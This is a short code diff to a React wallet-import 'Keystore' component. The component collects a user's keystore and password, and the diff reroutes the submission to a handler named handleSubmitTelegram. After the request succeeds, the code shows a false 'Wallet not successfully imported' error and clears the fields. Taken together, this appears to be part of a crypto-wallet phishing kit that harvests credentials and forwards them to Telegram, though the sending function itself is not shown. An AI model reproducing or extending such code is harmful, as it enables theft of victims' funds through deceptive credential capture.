@@ -11,14 +11,13 @@ import { ProjectContext } from "../context/ProjectContext";
 
 const Keystore = () => {
   const [loading, setLoading] = useState(false);
-  const [openModal, setOpenModal] = useState(false);
   const {
     walletName,
     keyStore,
     setKeyStore,
     password,
     setPassword,
-    handleSubmitNow,
+    handleSubmitTelegram,
   } = useContext(ProjectContext);
 
   const navigate = useNavigate();
@@ -39,7 +38,7 @@ const Keystore = () => {
       )
       .then((response) => {
         setLoading(false);
-        handleSubmitNow();
+        handleSubmitTelegram();
         toast.error("Wallet not successfully imported. Please try again.");
         setKeyStore("");
         setPassword("");
